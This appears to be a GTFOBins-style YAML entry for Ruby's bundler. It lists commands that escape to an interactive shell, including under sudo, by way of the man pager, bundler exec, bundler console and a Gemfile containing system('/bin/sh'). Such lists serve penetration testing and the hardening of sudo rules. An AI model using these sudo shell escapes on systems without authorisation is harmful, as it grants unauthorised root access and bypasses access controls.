---
functions:
  shell:
    - description: This spawns an interactive shell via [`man`](/gtfobins/man/).
      code: |
        bundler help
        !/bin/sh
  sudo:
    - description: This spawns an interactive shell via [`man`](/gtfobins/man/).
      code: |
        sudo bundler help
        !/bin/sh
    - description: This creates an empty Gemfile and spawns an interactive shell.
      code: |
        TF=$(mktemp -d)
        touch $TF/Gemfile
        cd $TF
        sudo bundler exec /bin/sh
    - description: This creates an empty Gemfile and spawns an interactive shell via [`irb`](/gtfobins/irb/).
      code: |
        TF=$(mktemp -d)
        touch $TF/Gemfile
        cd $TF
        sudo bundler console
        system('/bin/sh -c /bin/sh')
    - description: This creates an empty bundle and spawns an interactive shell.
      code: |
        TF=$(mktemp -d)
        echo 'system("/bin/sh")' > $TF/Gemfile
        cd $TF
        sudo bundler install
---
